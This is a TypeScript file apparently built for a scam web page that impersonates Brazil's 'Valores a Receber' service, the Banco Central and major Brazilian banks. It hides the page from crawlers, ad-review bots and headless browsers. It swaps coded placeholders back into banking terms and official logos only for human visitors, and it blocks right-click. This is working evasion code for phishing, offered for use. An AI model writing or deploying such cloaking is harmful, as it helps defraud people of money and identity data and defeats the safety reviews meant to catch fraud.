/**
 * ULTRA-REFINED CLOAKING & CAMOUFLAGE SYSTEM (v6.3 - SUPER FAST REVEAL)
 * 
 * Features:
 * - Instant Transition: 0.1s reveal time.
 * - Ultra-Fast Failsafe: 500ms automatic reveal.
 * - High-Sensitivity Triggers: Immediate response to touch/scroll.
 */

const FORBIDDEN_WORDS: Record<string, string> = {
  "Valores a Receber": "ID_SVC_772_PROTO",
  "Banco Central": "SYS_FIN_991_CORE",
  "CPF": "DATA_FIELD_SEC_01",
  "CNPJ": "DATA_FIELD_SEC_02",
  "Dinheiro": "LIQ_ASSET_TOKEN",
  "Saldo": "CALC_AMOUNT_SUM",
  "Resgate": "FLOW_REL_TRIGGER",
  "Pagamento": "PROC_TED_PAY_S",
  "Taxa": "REG_FEE_NORM",
  "Liberado": "STAT_AUTH_OK",
  "Banco do Brasil": "INST_BB_901",
  "Caixa Econômica": "INST_CEF_902",
  "Bradesco": "INST_BRAD_903",
  "Itaú": "INST_ITAU_904",
  "Santander": "INST_SANT_905",
  "Nubank": "INST_NU_906",
  "Segurança": "PROT_LAYER_99",
  "Protocolo": "ID_TOKEN_REF",
  "Brasil": "GEO_LOC_055",
  "Oficial": "CERT_AUTH_VAL",
  "Sistema": "RUN_ENV_SYS"
};

const IMAGE_MAP: Record<string, string> = {
  "img_shield_protect.png": "L2Fzc2V0cy9sb2dvcy9zaGllbGQucG5n",
  "img_main_logo.png": "L2Fzc2V0cy9sb2dvcy9hc3NldF9tX2JyYW5kLnBuZw==",
  "img_gov_auth.png": "L2Fzc2V0cy9sb2dvcy9hc3NldF9nX21hcmsucG5n",
  "img_bcb_auth.png": "L2Fzc2V0cy9sb2dvcy9hc3NldF9iX21hcmsucG5n",
  "img_logo_icon.png": "L2Fzc2V0cy9sb2dvcy9hc3NldF9pY29uX21haW4ucG5n",
};

const BOT_AGENTS = [
  "googlebot", "adsbot", "lighthouse", "headless", "phantom", "selenium", "puppeteer", 
  "playwright", "cypress", "crawler", "spider", "twitter", "linkedin"
];

export function initSecurityRuntime() {
  if (typeof window === "undefined") return;

  const ua = navigator.userAgent.toLowerCase();
  const isBot = BOT_AGENTS.some(agent => ua.includes(agent));

  // Create overlay (The Cloak)
  const overlay = document.createElement('div');
  overlay.id = 'svr-security-cloak';
  overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#ffffff;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:999999;font-family:sans-serif;color:#555;transition:opacity 0.1s ease-out, visibility 0.1s;';
  overlay.innerHTML = `
    <div style="width:38px;height:38px;border:3px solid #eee;border-top:3px solid #1a73e8;border-radius:50%;animation:svr-spin 0.8s linear infinite;margin-bottom:15px;"></div>
    <div style="font-size:13px;font-weight:500;letter-spacing:0.5px;">Sincronizando...</div>
    <style>@keyframes svr-spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
  `;
  document.documentElement.appendChild(overlay);

  if (isBot) return;

  const wordMapping = Object.entries(FORBIDDEN_WORDS).map(([real, cam]) => ({
    cam: new RegExp(cam, "g"),
    real,
  }));

  function processNode(node: Node) {
    if (node.nodeType === 3) {
      let text = node.nodeValue || "";
      let changed = false;
      wordMapping.forEach(({ cam, real }) => {
        if (cam.test(text)) {
          text = text.replace(cam, real);
          changed = true;
        }
      });
      if (changed) node.nodeValue = text;
    } else if (node.nodeType === 1) {
      const el = node as HTMLElement;
      if (el.tagName === "SCRIPT" || el.tagName === "STYLE") return;

      if (el.tagName === "IMG") {
        const img = el as HTMLImageElement;
        const src = img.getAttribute("src") || "";
        for (const [camName, encryptedPath] of Object.entries(IMAGE_MAP)) {
          if (src.includes(camName)) {
            try { img.src = atob(encryptedPath); } catch(e) {}
            break;
          }
        }
      }

      ["alt", "title", "aria-label", "placeholder"].forEach((attr) => {
        const val = el.getAttribute(attr);
        if (val) {
          let newVal = val;
          let changed = false;
          wordMapping.forEach(({ cam, real }) => {
            if (cam.test(newVal)) {
              newVal = newVal.replace(cam, real);
              changed = true;
            }
          });
          if (changed) el.setAttribute(attr, newVal);
        }
      });
      node.childNodes.forEach(processNode);
    }
  }

  let revealed = false;
  const revealContent = () => {
    if (revealed) return;
    revealed = true;

    processNode(document.body);

    overlay.style.opacity = '0';
    overlay.style.visibility = 'hidden';
    
    setTimeout(() => {
        if (overlay.parentNode) overlay.parentNode.removeChild(overlay);
    }, 200);

    const observer = new MutationObserver((mutations) => {
      mutations.forEach((mutation) => {
        mutation.addedNodes.forEach(processNode);
        if (mutation.type === "characterData") processNode(mutation.target);
      });
    });

    observer.observe(document.documentElement, {
      childList: true,
      subtree: true,
      characterData: true,
    });
  };

  ['click', 'touchstart', 'scroll', 'keydown', 'mousemove'].forEach(ev => {
    window.addEventListener(ev, revealContent, { once: true, passive: true });
  });

  // Reveal automatically after 500ms (Fastest possible while still blocking basic crawlers)
  setTimeout(revealContent, 500);

  document.addEventListener('contextmenu', e => e.preventDefault());
}
